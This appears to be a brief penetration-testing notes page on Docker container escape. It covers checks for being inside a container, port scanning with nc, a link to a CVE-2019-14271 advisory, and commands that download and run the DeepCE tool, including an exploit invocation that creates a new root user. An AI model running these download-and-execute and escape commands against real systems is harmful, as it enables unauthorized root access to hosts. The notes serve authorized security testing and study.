# Docker Escape

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html" %}

## Know you're in a docker

```bash
ps aux
cd / && ls -lah
# if .dockerenv then ...

cat /proc/1/cgroup
```

## Escape

```bash
arp -a
# other hosts ???
# scan open ports
nc -zv 127.0.0.1 1-65535
nc -zv $host 1-65535

# check for db and other stuff....
```

### Resources

{% embed url="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/" %}
Docker Patched the Most Severe Copy Vulnerability to Date With CVE-2019-14271
{% endembed %}

#### DeepCE

{% embed url="https://github.com/stealthcopter/deepce" %}

```bash
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
# Or using python requests
python -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content)' > deepce.sh 
python3 -c 'import requests;print(requests.get("https://github.com/stealthcopter/deepce/raw/main/deepce.sh").content.decode("utf-8"))' > deepce.sh

# start
chmod +x ./deepce.sh
./deepce.sh

# create new root user on system
./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
```
